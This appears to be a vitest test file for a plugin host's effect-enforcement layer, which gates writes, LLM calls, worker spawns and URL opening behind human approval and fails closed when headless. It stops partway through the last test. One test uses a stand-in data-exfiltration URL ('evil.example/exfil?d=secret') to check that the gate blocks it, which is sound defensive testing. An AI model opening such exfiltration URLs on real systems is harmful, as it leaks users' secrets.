// Actual effects retain descriptor scope, common policy ordering and effect-before-execution enforcement.
import { describe, it, expect, beforeEach, vi } from "vitest";
import { randomUUID } from "node:crypto";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PermissionManager, type ReviewerDispatchResult } from "../permission-manager.js";
let permissionManager: PermissionManager;

import type { ApprovalChoice, ApprovalDecision, ApprovalGate, ApprovalRequest, ApprovalRequestInput,
} from "../approval-gate.js";
import {
  enforceMutatingEffects,
  gateMutatingEffect,
  snapshotEffectArguments,
  runWithEffectGateContext,
  currentEffectGateContext,
  GATED_EFFECT_PATHS,
  ENFORCEMENT_EXCLUSIONS,
  EffectBoundaryDeniedError,
  type EffectGateContext,
  __resetEffectGrantsForTest,
} from "../effect-enforcement.js";
import {
  writeClassifiedPaths,
  CHOKEPOINT_EFFECT,
  HOSTAPI_EFFECT_BY_PATH,
} from "../effect-kind.js";
import {
  instrumentEffectsByPath,
  INSTRUMENTED,
} from "../hostapi-effect-recorder.js";
import {
  createEffectLedger,
  runWithEffectLedger } from "../effect-ledger.js";

beforeEach(() => {
  __resetEffectGrantsForTest();
  permissionManager = new PermissionManager(join(tmpdir(), `effect-policy-${randomUUID()}.json`));
  permissionManager.setMode("strict");
});

// A stub ApprovalGate that records every request and answers with a fixed choice.
function makeGate(choice: ApprovalChoice | ApprovalChoice[]): {
  gate: ApprovalGate;
  requests: Array<ApprovalRequestInput>;
} {
  const requests: Array<ApprovalRequestInput> = [];
  const answers = Array.isArray(choice) ? [...choice] : null;
  const gate = {
    requestAndWait: async (
      req: ApprovalRequestInput,
    ): Promise<ApprovalDecision> => {
      requests.push(req);
      const next = answers ? (answers.shift() ?? "deny-once") : (choice as ApprovalChoice);
      return { requestId: req.id, choice: next };
    },
  } as unknown as ApprovalGate;
  return { gate, requests };
}

// A fake per-plugin hostApi whose real impls only log the method they ran.
function makeApi(log: string[]) {
  return {
    // gated async writes
    triggerConversation: async (_spec: unknown,
    ): Promise<{ accepted: boolean }> => {
      log.push("trigger");
      return { accepted: true };
    },
    callLlm: async (_prompt: unknown): Promise<string> => {
      log.push("llm");
      return "resp";
    },
    spawnWorker: async (_spec: unknown,
    ): Promise<{ pid: number; socketPath: null }> => {
      log.push("spawnWorker");
      return { pid: 123, socketPath: null };
    },
    storage: {
      write: async (_rel: string, _data?: unknown): Promise<void> => {
        log.push("write");
      },
      // gated path but a READ — never prompts (effect from SOT).
      read: async (_rel: string): Promise<string> => {
        log.push("read");
        return "data";
      },
    },
  };
}

const deps = (
  gate: ApprovalGate,
  assertActive: () => void = () => {},
) => ({
  pluginId: "p1",
  approvalGate: gate,
  permissionManager,
  resolveStoragePath: (relativePath: string) => join(tmpdir(), "effect-storage", relativePath),
  assertActive,
});

describe("mandatory effect policy and standalone lifecycle", () => {
  it("each active mutating chokepoint receives its own permission", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));

    let writeResult: unknown = "sentinel";
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.triggerConversation({ source: "s" });
      writeResult = await api.storage.write("a.txt", "x");
      await api.callLlm("hello");
    },
    );

    expect(requests).toHaveLength(3);
    expect(log).toEqual(["trigger", "write", "llm"]); // every impl ran in order
    expect(writeResult).toBeUndefined(); // identical return value (void)
  });

  it("standalone lifecycle storage remains outside the tool policy", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await api.storage.write("a.txt", "x"); // outside any invocation scope
    expect(requests).toHaveLength(0);
    expect(log).toEqual(["write"]);
  });
});

describe("foreground write permission at the actual effect", () => {
  it("ALLOW → the real impl proceeds and returns its value", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));

    let llmResult: unknown;
    await runWithEffectGateContext({ headless: false, toolName: "meeting_start" }, async () => {
      llmResult = await api.callLlm("hi");
    },
    );

    expect(requests).toHaveLength(1);
    expect(requests[0]).toMatchObject({
      source: "plugin",
      sourcePluginId: "p1",
      toolName: "meeting_start",
      approvalScope: expect.stringMatching(/^[a-f0-9]{64}$/u),
      args: { effect: "write", methodPath: "callLlm" },
    });
    expect(log).toEqual(["llm"]);
    expect(llmResult).toBe("resp");
  });

  it("DENY → throws EffectBoundaryDeniedError and the mutation NEVER executes", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));

    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await expect(api.storage.write("secret.json", "x"),
        ).rejects.toBeInstanceOf(
        EffectBoundaryDeniedError);
    },
    );

    expect(requests).toHaveLength(1); // it DID ask
    expect(requests[0].args).toMatchObject({ methodPath: "storage.write", target: "secret.json",
    });
    expect(log).toEqual([]); // ... and the real write never ran
  });

  it("a nested-namespace WRITE is gated under its dotted PATH", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.storage.write("notes/a.md", "x");
    },
    );
    expect(requests[0]?.approvalScope).toMatch(/^[a-f0-9]{64}$/u);
    expect(log).toEqual(["write"]);
  });

  it("revalidates the HostApi incarnation after approval and before the effect", async () => {
    const log: string[] = [];
    let approve!: (decision: ApprovalDecision) => void;
    const gate = {
      requestAndWait: (request: ApprovalRequestInput) =>
        new Promise<ApprovalDecision>((resolve) => {
          approve = resolve;
        }).then((decision) => ({ ...decision, requestId: request.id })),
    } as unknown as ApprovalGate;
    let active = true;
    const api = enforceMutatingEffects(
      makeApi(log),
      deps(gate, () => {
        if (!active) throw new Error("stale HostApi incarnation");
      }),
    );

    const call = runWithEffectGateContext(
      { headless: false, toolName: "t" },
      () => api.storage.write("stale.txt", "x"),
    );
    await vi.waitFor(() => expect(approve).toBeTypeOf("function"));
    active = false;
    approve({ requestId: "ignored", choice: "allow-once" });

    await expect(call).rejects.toThrow("stale HostApi incarnation");
    expect(log).toEqual([]);
  });
});

describe("enforceMutatingEffects — openExternalUrl is now GATED (moved out of the exclusions)", () => {
  // A hostApi exposing openExternalUrl as a real async write impl.
  function makeUrlApi(log: string[]) {
    return {
      openExternalUrl: async (_url: string): Promise<void> => {
        log.push("open");
      },
    };
  }

  it("foreground external actions ask before opening their URL", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = enforceMutatingEffects(makeUrlApi(log), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await expect(api.openExternalUrl("https://evil.example/exfil?d=secret"),
        ).rejects.toBeInstanceOf(
        EffectBoundaryDeniedError);
    },
    );
    expect(requests).toHaveLength(1); // the effect-gate fired
    expect(requests[0]).toMatchObject({
      category: "agent-action",
      args: { effect: "write", methodPath: "openExternalUrl", target: "https://evil.example",
      },
    });
    expect(log).toEqual([]); // DENY → the browser was never opened
  });

  it("standalone lifecycle URL opening remains outside the tool pipeline", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = enforceMutatingEffects(makeUrlApi(log), deps(gate));
    await api.openExternalUrl("https://example.com");
    expect(requests).toHaveLength(0);
    expect(log).toEqual(["open"]);
  });

});

describe("enforceMutatingEffects — reads never prompt", () => {
  it("a gated-namespace READ method passes through with no approval", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    let v: unknown;
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      v = await api.storage.read("a.txt");
    },
    );
    expect(requests).toHaveLength(0);
    expect(v).toBe("data");
    expect(log).toEqual(["read"]);
  });
});

describe("enforceMutatingEffects — headless = NO modal (fail-closed)", () => {
  it("a write in a headless invocation throws WITHOUT asking and does not execute", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-always");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));

    let caught: unknown;
    await runWithEffectGateContext({ headless: true, toolName: "routine_tool" }, async () => {
      try {
        await api.storage.write("a.txt", "x");
      } catch (err) {
        caught = err;
      }
    },
    );

    expect(requests).toHaveLength(0); // a modal is impossible headless — never asked
    expect(caught).toBeInstanceOf(EffectBoundaryDeniedError);
    expect((caught as EffectBoundaryDeniedError).reason).toBe("headless");
    expect(log).toEqual([]); // fail-closed: the mutation did NOT run
  });
});

describe("enforceMutatingEffects — dedup (one grant ends repeats, never widened)", () => {
  it("allow-always suppresses repeat modals for the SAME descriptor", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-always");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.storage.write("a.txt", "1");
      await api.storage.write("a.txt", "1");
      await api.storage.write("a.txt", "1");
    },
    );
    expect(requests).toHaveLength(1); // one "always" ended the repeats
    expect(log).toEqual(["write", "write", "write"]);
  });

  it("allow-once dedups N writes to one target WITHIN a single invocation", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.storage.write("a.txt", "1");
      await api.storage.write("a.txt", "1");
    },
    );
    expect(requests).toHaveLength(1);
    expect(log).toEqual(["write", "write"]);
  });

  it("a DIFFERENT target re-prompts — the grant is not widened beyond its descriptor", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-always");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await api.storage.write("a.txt", "1");
      await api.storage.write("b.txt", "2"); // different target → fresh approval
    },
    );
    expect(requests).toHaveLength(2);
    expect(log).toEqual(["write", "write"]);
  });

  it("deny-always short-circuits a repeat to a throw without re-prompting", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-always");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await expect(api.storage.write("a.txt", "1")).rejects.toBeInstanceOf(EffectBoundaryDeniedError,
        );
      await expect(api.storage.write("a.txt", "1")).rejects.toBeInstanceOf(EffectBoundaryDeniedError,
        );
    },
    );
    expect(requests).toHaveLength(1); // remembered the deny, did not re-ask
    expect(log).toEqual([]);
  });
});

describe("invalid effect arguments fail before mutation", () => {
  it("a throwing getter cannot gain a broader descriptor grant", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    const hostileSpec = { get source(): never { throw new Error("hostile getter"); }, prompt: "p" };
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await expect(api.triggerConversation(hostileSpec)).rejects.toThrow("hostile getter");
    });
    expect(requests).toHaveLength(0);
    expect(log).toEqual([]);
  });
});

describe("gateMutatingEffect — direct unit behaviour", () => {
  it("an active direct storage effect cannot bypass permission", async () => {
    const { gate, requests } = makeGate("deny-once");
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await expect(gateMutatingEffect({ pluginId: "p1", methodPath: "storage.write", effect: "write", target: "a", input: ["a", "value"], approvalGate: gate, permissionManager, resolveStoragePath: (relativePath) => join(tmpdir(), "effect-storage", relativePath) })).rejects.toBeInstanceOf(EffectBoundaryDeniedError);
    });
    expect(requests).toHaveLength(1);
  });

  it("ordinary metadata reads do not ask", async () => {
    const { gate, requests } = makeGate("deny-once");
    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
      await gateMutatingEffect({
        pluginId: "p1",
        methodPath: "getInstalledPluginIds",
        effect: "read",
        target: "https://x",
        approvalGate: gate,
        permissionManager,
        resolveStoragePath: (relativePath: string) => join(tmpdir(), "effect-storage", relativePath),

      });
    },
    );
    expect(requests).toHaveLength(0);
  });

  it("no gate context bound → returns without asking (out-of-invocation hostApi call)", async () => {
    const { gate, requests } = makeGate("deny-once");
    expect(currentEffectGateContext()).toBeUndefined();
    await gateMutatingEffect({
      pluginId: "p1",
      methodPath: "hostFetch",
      effect: "write",
      target: "https://x",
      approvalGate: gate,
      permissionManager,
      resolveStoragePath: (relativePath: string) => join(tmpdir(), "effect-storage", relativePath),

    });
    expect(requests).toHaveLength(0);
  });

  it("keeps unavailable routine execution on the existing headless denial lane", async () => {
    const { gate, requests } = makeGate("allow-once");
    const onAuthorizationRequired = vi.fn();
    let caught: unknown;

    await runWithEffectGateContext(
      {
        headless: true,
        approvalSurface: "unavailable",
        toolName: "routine_tool",
      },
      async () => {
        try {
          await gateMutatingEffect({
            pluginId: "routine-plugin",
            methodPath: "storage.write",
            effect: "write",
            target: "routine.txt",
            input: ["routine.txt"],
            approvalGate: gate,
            permissionManager,
            resolveStoragePath: (relativePath: string) => join(tmpdir(), "effect-storage", relativePath),

          });
        } catch (error) {
          caught = error;
        }
      },
      onAuthorizationRequired,
    );

    expect(caught).toBeInstanceOf(EffectBoundaryDeniedError);
    expect((caught as EffectBoundaryDeniedError).reason).toBe("headless");
    expect(onAuthorizationRequired).not.toHaveBeenCalled();
    expect(requests).toHaveLength(0);
  });

  it("keeps the windowless terminal latch private until a write chokepoint trips it", async () => {
    const { gate, requests } = makeGate("allow-once");
    const onAuthorizationRequired = vi.fn();
    let caught: unknown;

    await runWithEffectGateContext(
      {
        headless: false,
        approvalSurface: "unavailable",
        toolName: "plugin_tool",
      },
      async () => {
        const ambient = currentEffectGateContext() as
          | (EffectGateContext & { onAuthorizationRequired?: unknown })
          | undefined;
        expect(ambient).toBeDefined();
        expect(ambient).not.toHaveProperty("onAuthorizationRequired");
        try {
          await gateMutatingEffect({
            pluginId: "windowless-plugin",
            methodPath: "storage.write",
            effect: "write",
            target: "windowless.txt",
            input: ["windowless.txt"],
            approvalGate: gate,
            permissionManager,
            resolveStoragePath: (relativePath: string) => join(tmpdir(), "effect-storage", relativePath),

          });
        } catch (error) {
          caught = error;
        }
      },
      onAuthorizationRequired,
    );

    expect(caught).toBeInstanceOf(EffectBoundaryDeniedError);
    expect((caught as EffectBoundaryDeniedError).reason).toBe("approval-unavailable");
    expect(onAuthorizationRequired).toHaveBeenCalledOnce();
    expect(requests).toHaveLength(0);
  });
});

describe("GATED_EFFECT_PATHS — SOT-derived async-only membership", () => {
  it("contains the design's async write chokepoints (incl. openExternalUrl) and EXCLUDES the verb-derived hostFetch + sync/circular writes", () => {
    for (const p of [
      "storage.write",
      "config.set",
      "storage.writeJson",
      "storage.rm",
      "storage.mkdir",
      "openAuthWindow",
      "openAuthPartitionViewer",
      "clearAuthPartition",
      "callLlm",
      "spawnWorker",
      "triggerConversation",
      "agentApproval.request",
      // openExternalUrl is now GATED (egress/exfil-class) — moved out of the exclusions; it is async so the await-based wrapper can gate it.
      "openExternalUrl",
    ]) {
      expect(GATED_EFFECT_PATHS.has(p)).toBe(true);
    }
    // Network effects self-gate inline; approval completion cannot wait on its own answer.
    for (const p of ["hostFetch", "agentApproval.respond"]) {
      expect(GATED_EFFECT_PATHS.has(p)).toBe(false);
    }
  });
});

describe("MAJOR-1 — the gated set is SOT-DERIVED + FAIL-CLOSED (not hand-curated)", () => {
  it("every gated path is WRITE-classified + ASYNC in the SOT (never a read, never sync)", () => {
    for (const p of GATED_EFFECT_PATHS) {
      const spec = HOSTAPI_EFFECT_BY_PATH[p];
      expect(spec, `gated path ${p} must exist in the SOT`).toBeDefined();
      // write-classified: a static write (selfRecorded hostFetch is never gated here)
      expect(
        CHOKEPOINT_EFFECT[spec.kind as keyof typeof CHOKEPOINT_EFFECT],
      ).toBe("write");
      // async: the await-based wrapper can only gate an already-async method
      expect(spec.async, `gated path ${p} must be declared async`).toBe(true);
    }
  });

  it("COMPLETENESS — gated ∪ exclusions PARTITIONS every write-classified path (fail-closed)", () => {
    const writeClassified = new Set(writeClassifiedPaths());
    const accountedFor = new Set<string>([
      ...GATED_EFFECT_PATHS,
      ...ENFORCEMENT_EXCLUSIONS.keys(),
    ]);

    // (a) Every write-classified path is either gated or explicitly excluded — a NEW write chokepoint added to the SOT can never silently ship un-enforced.
    const unaccounted = [...writeClassified].filter(
      (p) => !accountedFor.has(p),
    );
    expect(
      unaccounted,
      `write-classified path(s) that are NEITHER gated NOR explicitly excluded — gate them (async) or add to ENFORCEMENT_EXCLUSIONS: ${unaccounted.join(", ")}`,
    ).toEqual([]);

    // (b) No exclusion (or gated path) is fabricated — every accounted path is actually write-classified in the SOT (you cannot exclude a read / unknown).
    const overReaching = [...accountedFor].filter(
      (p) => !writeClassified.has(p),
    );
    expect(
      overReaching,
      `gated/excluded path(s) that are NOT write-classified in the SOT (stale entry?): ${overReaching.join(", ")}`,
    ).toEqual([]);

    // (c) The two sets are DISJOINT — a path is gated XOR excluded, never both.
    const both = [...GATED_EFFECT_PATHS].filter((p) =>
      ENFORCEMENT_EXCLUSIONS.has(p),
    );
    expect(both, `path(s) both gated AND excluded: ${both.join(", ")}`).toEqual(
      [],
    );
  });

  it("each exclusion carries a documented one-line reason", () => {
    for (const [path, reason] of ENFORCEMENT_EXCLUSIONS) {
      expect(reason, `exclusion ${path} must document a reason`).toBeTruthy();
      expect(reason.length).toBeGreaterThan(10);
    }
    // Self-gated network effects and approval completion have distinct enforcement boundaries.
    expect([...ENFORCEMENT_EXCLUSIONS.keys()].sort()).toEqual(
      ["agentApproval.respond", "hostFetch"].sort(),
    );
    // openExternalUrl is NO LONGER an exclusion — it is effect-gated.
    expect(ENFORCEMENT_EXCLUSIONS.has("openExternalUrl")).toBe(false);
  });
});

describe("headless effects use explicit grants before human fallback", () => {
  it("a remembered exact effect grant can authorize the same headless effect", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-always");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "fg" }, () => api.storage.write("a.txt", "1"));
    await runWithEffectGateContext({ headless: true, toolName: "routine" }, () => api.storage.write("a.txt", "1"));
    expect(requests).toHaveLength(1);
    expect(log).toEqual(["write", "write"]);
  });

  it("a foreground allow-once does not leak into a headless invocation either", async () => {
    const log: string[] = [];
    const { gate } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext(
      { headless: false, toolName: "fg" },
      async () => {
        await api.storage.write("a.txt", "1");
      },
    );
    // onceGrants are invocation-scoped, so they cannot reach the headless call, but assert headless fails closed regardless.
    await runWithEffectGateContext(
      { headless: true, toolName: "routine" },
      async () => {
        await expect(api.storage.write("a.txt", "2")).rejects.toBeInstanceOf(
          EffectBoundaryDeniedError,
        );
      },
    );
    expect(log).toEqual(["write"]); // only the foreground write ran
  });
});

describe("effect arguments are sealed before approval", () => {
  it("the modal and implementation share the first getter value", async () => {
    const { gate, requests } = makeGate("allow-once");
    // The implementation receives the sealed value used by the card and grant identity.
    const implSawSource: string[] = [];
    const api = enforceMutatingEffects(
      {
        triggerConversation: async (spec: {
          source: string;
        }): Promise<{ accepted: boolean }> => {
          implSawSource.push(spec.source); // Reads the sealed data property.
          return { accepted: true };
        },
      },
      deps(gate),
    );

    let reads = 0;
    const statefulSpec = {
      get source(): string {
        reads += 1;
        return `src-${reads}`; // a different value on every read
      },
    };

    await runWithEffectGateContext(
      { headless: false, toolName: "t" },
      async () => {
        await api.triggerConversation(statefulSpec);
      },
    );

    // The gate read the getter EXACTLY ONCE for its descriptor (the first read)…
    expect(requests).toHaveLength(1);
    expect(requests[0].args).toMatchObject({
      methodPath: "triggerConversation",
      target: "src-1",
    });
    // Execution sees the same value, without invoking the caller getter again.
    expect(implSawSource).toEqual(["src-1"]);
    expect(reads).toBe(1);
  });
});

describe("exact action grants avoid method-wide approval", () => {
  it("target-less and target-scoped writes both omit method-wide approval", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext(
      { headless: false, toolName: "t" },
      async () => {
        await api.callLlm("hi"); // The complete input still has an exact grant identity.
        await api.storage.write("a.txt", "x"); // target → scoped grant
      },
    );
    expect(requests[0].args).toMatchObject({
      methodPath: "callLlm",
    });
    expect((requests[0].args as { target?: unknown }).target).toBeUndefined();
    expect(requests[0].args).not.toHaveProperty("methodWide");
    expect(requests[1].args).toMatchObject({
      methodPath: "storage.write",
      target: "a.txt",
    });
    expect(
      (requests[1].args as { methodWide?: unknown }).methodWide,
    ).toBeUndefined();
  });

  it("spawnWorker approvals are scoped to worker command and filesystem grants", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate(["allow-session", "allow-session"]);
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    const base = {
      workerId: "embed",
      command: "C:/Python/python.exe",
      allowReadPaths: ["C:/worker.py"],
      allowWritePaths: ["C:/index-a"],
    };

    await runWithEffectGateContext(
      { headless: false, toolName: "t" },
      async () => {
        await api.spawnWorker(base);
        await api.spawnWorker({ ...base, allowWritePaths: ["C:/index-a"] });
        await api.spawnWorker({ ...base, allowWritePaths: ["C:/index-b"] });
      },
    );

    expect(requests).toHaveLength(2);
    expect(requests[0].args).toMatchObject({ methodPath: "spawnWorker" });
    expect(
      (requests[0].args as { methodWide?: unknown }).methodWide,
    ).toBeUndefined();
    expect(
      JSON.parse((requests[0].args as { target: string }).target),
    ).toMatchObject({
      workerId: "embed",
      command: "C:/Python/python.exe",
      allowRead: ["C:/worker.py"],
      allowWrite: ["C:/index-a"],
    });
    expect(
      JSON.parse((requests[1].args as { target: string }).target),
    ).toMatchObject({
      allowWrite: ["C:/index-b"],
    });
    expect(log).toEqual(["spawnWorker", "spawnWorker", "spawnWorker"]);
  });

  it("spawnWorker grants remain scoped by the host-bound plugin id", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate(["allow-session", "allow-session"]);
    const apiA = enforceMutatingEffects(makeApi(log), deps(gate));
    const apiB = enforceMutatingEffects(makeApi(log), {
      ...deps(gate),
      pluginId: "p2",
    });
    const spec = {
      workerId: "embed",
      command: "C:/Python/python.exe",
      allowReadPaths: ["C:/worker.py"],
      allowWritePaths: ["C:/index"],
    };

    await runWithEffectGateContext(
      { headless: false, toolName: "t" },
      async () => {
        await apiA.spawnWorker(spec);
        await apiB.spawnWorker(spec);
      },
    );

    expect(requests).toHaveLength(2);
    expect(requests[0].sourcePluginId).toBe("p1");
    expect(requests[1].sourcePluginId).toBe("p2");
    expect(requests[0].args).toEqual(requests[1].args);
    expect(log).toEqual(["spawnWorker", "spawnWorker"]);
  });

  it("spawnWorker malformed object specs do not become method-wide approvals", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-session");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));

    await runWithEffectGateContext(
      { headless: false, toolName: "t" },
      async () => {
        await api.spawnWorker({});
      },
    );

    expect(requests).toHaveLength(1);
    expect(requests[0].args).toMatchObject({ methodPath: "spawnWorker" });
    expect(
      (requests[0].args as { methodWide?: unknown }).methodWide,
    ).toBeUndefined();
    expect(JSON.parse((requests[0].args as { target: string }).target)).toEqual(
      {
        workerId: "",
        command: "",
        allowRead: [],
        allowWrite: [],
      },
    );
    expect(log).toEqual(["spawnWorker"]);
  });

  it("spawnWorker non-object specs do not become method-wide approvals", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-session");
    const api = enforceMutatingEffects(makeApi(log), deps(gate));

    await runWithEffectGateContext(
      { headless: false, toolName: "t" },
      async () => {
        await (api.spawnWorker as (spec: unknown) => Promise<unknown>)(
          "not-a-spec",
        );
      },
    );

    expect(requests).toHaveLength(1);
    expect(requests[0].args).toMatchObject({ methodPath: "spawnWorker" });
    expect(
      (requests[0].args as { methodWide?: unknown }).methodWide,
    ).toBeUndefined();
    expect(JSON.parse((requests[0].args as { target: string }).target)).toEqual(
      {
        workerId: "",
        command: "",
        allowRead: [],
        allowWrite: [],
        invalidSpec: true,
      },
    );
    expect(log).toEqual(["spawnWorker"]);
  });
});

describe("composed stack — enforceMutatingEffects(instrumentEffectsByPath(raw))", () => {
  // A raw hostApi-shaped object whose impls read `this` so we can prove binding.
  function makeRawApi(log: string[]) {
    return {
      marker: "ROOT",
      callLlm: async function (
        this: { marker: string },
        _p: unknown,
      ): Promise<string> {
        log.push(`llm:${this.marker}`);
        return "resp";
      },
      // a READ — never gated, always recorded
      getInstalledPluginIds: function (this: { marker: string }): string[] {
        log.push(`ids:${this.marker}`);
        return [];
      },
      storage: {
        marker: "STORAGE",
        write: async function (
          this: { marker: string },
          _rel: string,
        ): Promise<void> {
          log.push(`write:${this.marker}`);
        },
      },
    };
  }

  function composed(log: string[], gate: ApprovalGate) {
    return enforceMutatingEffects(
      instrumentEffectsByPath(
        makeRawApi(log) as unknown as Record<string, unknown>,
      ),
      deps(gate),
    ) as unknown as ReturnType<typeof makeRawApi>;
  }

  it("approved calls keep recorder order and implementation binding", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-once");
    const api = composed(log, gate);
    const ledger = createEffectLedger("cid-off");
    await runWithEffectLedger(ledger, () =>
      runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
        await api.callLlm("x");
        await api.storage.write("a.txt");
      }),
    );
    expect(requests).toHaveLength(2);
    // `this` reached the RAW namespace objects through BOTH layers
    expect(log).toEqual(["llm:ROOT", "write:STORAGE"]);
    // The recorder observes both authorized writes.
    expect(ledger.summary().effects.map((e) => e.kind)).toEqual([
      "callLlm",
      "storageWrite",
    ]);
  });

  it("allowed effects authorize before recording and implementation", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("allow-once");
    const api = composed(log, gate);
    const ledger = createEffectLedger("cid-allow");
    await runWithEffectLedger(ledger, () =>
      runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
        await api.callLlm("x");
      }),
    );
    expect(requests).toHaveLength(1); // gated
    expect(log).toEqual(["llm:ROOT"]); // impl ran after the allow
    expect(ledger.summary().effects.map((e) => e.kind)).toEqual(["callLlm"]); // recorded
  });

  it("denied writes neither execute nor become observed effects", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = composed(log, gate);
    const ledger = createEffectLedger("cid-deny");
    await runWithEffectLedger(ledger, () =>
      runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
        await expect(api.callLlm("x")).rejects.toBeInstanceOf(
          EffectBoundaryDeniedError,
        );
      }),
    );
    expect(requests).toHaveLength(1); // it asked
    expect(log).toEqual([]); // the impl never ran
    // OUTER composition: the recorder sits INSIDE the gate, so a denied effect is
    // never recorded — no phantom mutation row in the shadow dataset.
    expect(ledger.summary().effects).toEqual([]);
  });

  it("a READ flows through both layers ungated and recorded", async () => {
    const log: string[] = [];
    const { gate, requests } = makeGate("deny-once");
    const api = composed(log, gate);
    const ledger = createEffectLedger("cid-read");
    await runWithEffectLedger(ledger, () =>
      runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
        api.getInstalledPluginIds();
      }),
    );
    expect(requests).toHaveLength(0); // reads never prompt
    expect(log).toEqual(["ids:ROOT"]);
    expect(ledger.summary().effects.map((e) => e.kind)).toEqual([
      "getInstalledPluginIds",
    ]);
  });
});

describe("INSTRUMENTED idempotence symbol is PROPAGATED through the enforced wrapper", () => {
  it("the enforced output keeps INSTRUMENTED so a later instrument is a no-op (no double-wrap)", () => {
    const { gate } = makeGate("deny-once");
    const raw = {
      callLlm: async (): Promise<string> => "x",
      storage: { write: async (): Promise<void> => {} },
    };
    const instrumented = instrumentEffectsByPath(
      raw as unknown as Record<string, unknown>,
    );
    const enforced = enforceMutatingEffects(instrumented, deps(gate));

    // the fresh enforced object still carries the recorder's idempotence symbol…
    expect((enforced as Record<symbol, unknown>)[INSTRUMENTED]).toBe(true);
    // …including nested namespaces…
    expect(
      (enforced as { storage: Record<symbol, unknown> }).storage[INSTRUMENTED],
    ).toBe(true);
    // …so re-instrumenting it is a no-op (returns the SAME object — no re-wrap).
    expect(instrumentEffectsByPath(enforced)).toBe(enforced);
  });
});

describe("common policy at each actual effect", () => {
  function reviewerEvidence(level: "low" | "medium" | "high", outcome: "fresh" | "error" = "fresh"): ReviewerDispatchResult {
    return { verdict: { level, reason: "Effect review." }, outcome, cacheReason: "miss-not-found", judge: { judged: false, skip: "judge-off" } };
  }

  it("reviews an exact headless effect before allowing it", async () => {
    permissionManager.setMode("auto");
    const review = vi.spyOn(permissionManager, "dispatchReviewer").mockResolvedValue(reviewerEvidence("low"));
    const { gate, requests } = makeGate("deny-once");
    const log: string[] = [];
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext({ headless: true, toolName: "outer" }, async () => {
      await api.storage.write("a.txt", "first payload");
      await api.storage.write("b.txt", "second payload");
    });
    expect(review).toHaveBeenCalledTimes(2);
    expect(review.mock.calls[0][1].finalInput).toMatchObject({ pluginId: "p1", methodPath: "storage.write", target: "a.txt", input: ["a.txt", "first payload"] });
    expect(review.mock.calls[1][1].finalInput).toMatchObject({ target: "b.txt", input: ["b.txt", "second payload"] });
    expect(review.mock.calls[0][3]?.lane).toBe("headless");
    expect(requests).toHaveLength(0);
    expect(log).toEqual(["write", "write"]);
  });

  for (const outcome of ["high", "error"] as const) {
    it(`denies headless ${outcome} reviewer fallback without retry`, async () => {
      permissionManager.setMode("auto");
      const review = vi.spyOn(permissionManager, "dispatchReviewer").mockResolvedValue(reviewerEvidence("high", outcome === "error" ? "error" : "fresh"));
      const { gate, requests } = makeGate("allow-once");
      const log: string[] = [];
      const api = enforceMutatingEffects(makeApi(log), deps(gate));
      await runWithEffectGateContext({ headless: true, toolName: "outer" }, async () => {
